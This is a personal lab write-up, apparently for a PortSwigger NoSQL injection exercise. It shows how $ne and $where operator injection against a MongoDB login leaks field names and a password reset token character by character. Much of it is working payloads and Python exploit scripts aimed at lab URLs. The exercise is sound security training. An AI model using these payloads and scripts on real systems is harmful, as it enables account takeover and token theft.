The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, log in as `carlos`.

---

Goal: log in as Carlos

![[IMG/Pasted image 20240921040622.png]]
In Repeater, change the value of the password parameter from `"invalid"` to `{"$ne":"invalid"}`, then send the request. Notice that you now receive an `Account locked` error message. You can't access Carlos's account, but this response indicates that the `$ne` operator has been accepted and the application is vulnerable.

- In Burp's browser, attempt to reset the password for the `carlos` account. When you submit the `carlos` username, observe that the reset mechanism involves email verification, so you can't reset the account yourself.
    
- In Repeater, use the `POST /login` request to test whether the application is vulnerable to JavaScript injection:
    
    1. Add `"$where": "0"` as an additional parameter in the JSON data as follows: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`
    2. Send the request. Notice that you receive an `Invalid username or password` error message.
    3. Change `"$where": "0" to "$where": "1"`, then resend the request. Notice that you receive an `Account locked` error message. This indicates that the JavaScript in the `$where` clause is being evaluated.

![[IMG/Pasted image 20240921054622.png]]

Construct an attack to identify all the fields on the user object:

1. Update the `$where` parameter as follows: `"$where":"Object.keys(this)[1].match('^.{}.*')"`
2. Add two payload positions. The first identifies the character position number, and the second identifies the character itself: `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`


```php
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
```

```php
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "Object.keys(this)[1].match('^.{}.*')"}
```

```php
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "Object.keys(this)[1].match('^.{}.*')"}
```

```php
"$where":"Object.keys(this)[1].match('^.{<POSITION>}<CHR>.*')"
```

```php
"$where":"Object.keys(this)[1].match('^.{1}a.*')"
```

To identify further JSON parameters. You can do this by incrementing the index of the keys array with each attempt, for example: `"$where":"Object.keys(this[2].match('^.{}.*')"`

Notice that one of the JSON parameters is for a password reset token.

- Identify the `GET /forgot-password` request as a potentially interesting endpoint, as it relates to the password reset functionality. Right-click the request and select **Send to Repeater**.

![[IMG/Pasted image 20240921042948.png]]

-  In Repeater, submit an invalid field in the URL: `GET /forgot-password?foo=invalid`. Notice that the response is identical to the original response.
-  Submit the exfiltrated name of the password reset token field in the URL: `GET /forgot-password?YOURTOKENNAME=invalid`. Notice that you receive an `Invalid token` error message. This confirms that you have the correct token name and endpoint.
- In Intruder, use the `POST /login` request to construct an attack that extracts the value of Carlos's password reset token:
    
    1. Keep the settings from your previous attack, but update the `$where` parameter as follows: `"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"`
        
        Make sure that you replace `YOURTOKENNAME` with the password reset token name that you exfiltrated in the previous step.
        
    2. Click **Start attack**.
    3. Sort the attack results by **Payload 1**, then **Length**, to identify responses with an `Account locked` message instead of the `Invalid username or password` message. Note the letters from the **Payload 2** column down.
- In Repeater, submit the value of the password reset token in the URL of the `GET / forgot-password` request: `GET /forgot-password?YOURTOKENNAME=TOKENVALUE`.

---

Script details.

Error message: `Account locked: please reset your password`

- Find token name
- Use token name to get token value
- Does need a csrf for forgot password function

```php
"$where": "function(){ if(Object.keys(this)[3].match(/^X/) ) return 1; else 0; }"
```
- Value to change `X`
 
 Password field:

```php
{"$ne":"invalid"}
```

Full payload:

```php
{"username":"carlos","password":{"$ne":""}, "$where": "function(){ if(Object.keys(this)[3].match(/^X/) ) return 1; else 0; }"}
```
- Is case sensitive, (changed `object` to `Object`) and now i'm getting the correct server response.

![[IMG/Pasted image 20240921113419.png]]

Change the x position to find the token name.

Then i can move onto the next part of the exploit. 
_unfinished_
- needs a csrf but it looks like it needs it as the `cookie:` 
```php
#!/usr/bin/python3

import sys
import requests
import urllib3
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


# Brute-Force the token name
def get_token_name(s, url):
	username = "carlos"
	password = {"$ne":""}
	for i in string.ascii_letters:
		password_extracted = ''
		data = {
			"username": username,
			"password": password,
			"$where": "function(){ if(Object.keys(this)[3].match(/^%s/) ) return 1; else 0; }" %(i)
		}
	
		r = s.post(url + 'login', json=data, verify=False, proxies=proxies)
		if 'Account locked:' in r.text:
				password_extracted += i
				sys.stdout.write('\r' + password_extracted)
				sys.stdout.flush()
				break # Break out of the for loop and move to the next
	
		else:
			sys.stdout.write('\r' + password_extracted + i)
			sys.stdout.flush()


# Print user intructions
def main():
	if len(sys.argv) != 2:
		print("[+] Usage: %s <URL>" % sys.argv[0])
		print("[+] Example: %s www.example.com/" % sys.argv[0])
		sys.exit(-1)
		
	print("[+] Trying to find the token name...")
	
	
	url = sys.argv[1]
	s = requests.Session()
	get_token_name(s, url)
	
if __name__ == '__main__':
	main()

```

Resources:
https://bobbyhadz.com/blog/how-to-use-cookies-in-python-requests#sending-cookies-with-a-request

https://docs.python-requests.org/en/latest/user/advanced/#session-objects

- Set cookie manually:

```php
response = session.get(
    'https://httpbin.org/cookies',
    cookies={'my-cookie': 'my-value'}
```

New way to extract the cookie csrf
- Not sure why this is the csrf, but i think it's something to do with it being http only header `Set-Cookie: session=qySc3bGAfYQrjJYRy2aP1paCKilePFHr; Secure; HttpOnly;`

```php
# Get csrf
def get_csrf(s, url):
	r = s.get(url + 'login', verify=False, proxies=proxies)
	csrf = r.cookies.get_dict()
	print(f'The csrf is: {csrf}')
	return csrf
```

Now i just need to try and use it in my exploit. Looking at someone else's code they are not getting the cookie, so i could be doing something wrong. 

Mongo first entry is usually `_id`

I Finally figured out the payload, changes made:
`data=data` to `json=data`
- Needed to be in json format.



---

Resources:
https://siunam321.github.io/ctf/portswigger-labs/nosql-injection/nosqli-4/

Get column names:

```php
#!/usr/bin/python3

import requests
from string import ascii_letters

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl

    def extractFieldNames(self, fieldPosition):
        LOGIN_ENDPOINT = '/login'
        LAST_CHARACTER = ascii_letters[-1]
        username = 'carlos'
        password = {
            '$ne': 'foobar'
        }
        fieldName = str()
        while True:
            for character in ascii_letters:
                payload = f'^{fieldName}{character}.*' if fieldName else f'^{character}.*'
                whereOperatorKey = f'Object.keys(this)[{fieldPosition}].match("{payload}")'
                print(f'[*] Sending payload: {whereOperatorKey}', end='\r')

                loginData = {
                    'username': username,
                    'password': password,
                    '$where': whereOperatorKey
                }
                loginRespond = requests.post(f'{self.baseUrl}{LOGIN_ENDPOINT}', json=loginData)
                isValidCharacter = False if 'Invalid username' in loginRespond.text else True
                isLastCharacter = character == LAST_CHARACTER
                isEmptyFieldName = True if len(fieldName) == 0 else False

                if not isValidCharacter and isLastCharacter and isEmptyFieldName:
                    print(f'[-] Looped through all possible characters, no luck. This field position {fieldPosition} doesn\'t have a field?')
                    return
                if not isValidCharacter and isLastCharacter:
                    print('[-] Looped through all possible characters, no luck. Maybe we found all the characters?')
                    print(f'[*] Field name: {fieldName}')
                    return
                if isValidCharacter:
                    fieldName += character
                    print(f'\n[+] Found valid character "{character}" on field position {fieldPosition}')
                    break

if __name__ == '__main__':
    baseUrl = 'https://0a3700f903b7ddb780363504004e0002.web-security-academy.net'
    exploit = Exploit(baseUrl)

    # you can change your minimum/maximum field position here
    MINIMUM_FIELD_POSITION = 0
    MAXIMUM_FIELD_POSITION = 4
    for fieldPosition in range(MINIMUM_FIELD_POSITION, MAXIMUM_FIELD_POSITION):
        exploit.extractFieldNames(fieldPosition)

```

Get reset token

```php
import requests
from string import ascii_letters, digits

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.LOGIN_ENDPOINT = '/login'
        self.USERNAME = 'carlos'
        self.PASSWORD = {
            '$ne': 'foobar'
        }
        self.CHARACTER_SET = ascii_letters + digits
        self.LAST_CHARACTER = self.CHARACTER_SET[-1]

    def extractFieldNames(self, fieldPosition):
        fieldName = str()
        while True:
            for character in self.CHARACTER_SET:
                payload = f'^{fieldName}{character}.*' if fieldName else f'^{character}.*'
                whereOperatorKey = f'Object.keys(this)[{fieldPosition}].match("{payload}")'
                print(f'[*] Sending payload: {whereOperatorKey}', end='\r')

                loginData = {
                    'username': self.USERNAME,
                    'password': self.PASSWORD,
                    '$where': whereOperatorKey
                }
                loginRespond = requests.post(f'{self.baseUrl}{self.LOGIN_ENDPOINT}', json=loginData)
                isValidCharacter = False if 'Invalid username' in loginRespond.text else True
                isEmptyFieldName = True if len(fieldName) == 0 else False
                isLastCharacter = character == self.LAST_CHARACTER

                if not isValidCharacter and isLastCharacter and isEmptyFieldName:
                    print(f'[-] Looped through all possible characters, no luck. This field position {fieldPosition} doesn\'t have a field?')
                    return
                if not isValidCharacter and isLastCharacter:
                    print('[-] Looped through all possible characters, no luck. Maybe we found all the characters?')
                    print(f'[*] Field name: {fieldName}')
                    return
                if isValidCharacter:
                    fieldName += character
                    print(f'\n[+] Found valid character "{character}" on field position {fieldPosition}')
                    break

    def extractFieldData(self, fieldName):
        username = 'carlos'
        password = {
            '$ne': 'foobar'
        }
        characterIndex = 0
        foundResetToken = str()
        while True:
            for character in self.CHARACTER_SET:
                payload = f'this.pwResetTkn[{characterIndex}] == "{character}"'
                print(f'[*] Trying payload: {payload}', end='\r')
                loginData = {
                    'username': self.USERNAME,
                    'password': self.PASSWORD,
                    '$where': payload
                }
                loginRespond = requests.post(f'{self.baseUrl}{self.LOGIN_ENDPOINT}', json=loginData)
                isValidCharacter = False if 'Invalid username' in loginRespond.text else True
                isLastCharacter = character == self.LAST_CHARACTER

                if not isValidCharacter and isLastCharacter:
                    print('[-] Looped through all possible characters, no luck. Maybe we found all the characters?')
                    print(f'[*] Password reset token: {foundResetToken}')
                    return
                if isValidCharacter:
                    foundResetToken += character
                    print(f'\n[+] Found valid character "{character}" on character position {characterIndex}')
                    characterIndex += 1
                    break

if __name__ == '__main__':
    baseUrl = 'https://0a5d009d04e55d29804112b8009f007b.web-security-academy.net'
    exploit = Exploit(baseUrl)

    # you can change your minimum/maximum field position here
    # MINIMUM_FIELD_POSITION = 0
    # MAXIMUM_FIELD_POSITION = 4
    # for fieldPosition in range(MINIMUM_FIELD_POSITION, MAXIMUM_FIELD_POSITION):
    #     exploit.extractFieldNames(fieldPosition)

    FIELD_NAME = 'pwResetTkn'
    exploit.extractFieldData(FIELD_NAME)

```